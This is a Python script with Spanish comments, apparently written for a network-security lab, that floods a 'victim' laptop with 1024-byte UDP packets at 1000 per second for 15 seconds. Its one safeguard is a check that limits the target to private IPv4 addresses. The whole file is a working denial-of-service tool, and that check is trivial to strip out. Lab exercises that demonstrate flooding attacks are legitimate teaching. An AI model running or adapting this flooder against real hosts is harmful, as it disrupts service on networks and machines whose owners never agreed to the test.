import socket
import time
import ipaddress

# Cambiar por la IP local de la laptop víctima
VICTIM_IP = "172.20.10.3"
PORT = 5005

DURATION = 15           # Duración en segundos
PACKETS_PER_SECOND = 1000
PAYLOAD = b"UDP_LAB_TEST:" + b"X" * 1011  # 1024 bytes

# Limitar la simulación a una dirección IPv4 privada
ip = ipaddress.IPv4Address(VICTIM_IP)
private_networks = [
    ipaddress.IPv4Network("10.0.0.0/8"),
    ipaddress.IPv4Network("172.16.0.0/12"),
    ipaddress.IPv4Network("192.168.0.0/16"),
]

if not any(ip in network for network in private_networks):
    raise ValueError("Usa la IP privada de la víctima en la red del laboratorio.")

sent = 0
interval = 1 / PACKETS_PER_SECOND

with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
    print(f"Enviando UDP a {VICTIM_IP}:{PORT} durante {DURATION} segundos.")
    print("Puedes detenerlo antes con Ctrl + C.")

    start = time.perf_counter()
    end = start + DURATION

    try:
        while time.perf_counter() < end:
            sock.sendto(PAYLOAD, (VICTIM_IP, PORT))
            sent += 1
            time.sleep(interval)

    except KeyboardInterrupt:
        print("\nSimulación detenida.")

    except OSError as error:
        print(f"\nError de red: {error}")

    elapsed = time.perf_counter() - start

print(f"Paquetes enviados: {sent}")
print(f"Tiempo transcurrido: {elapsed:.2f} segundos")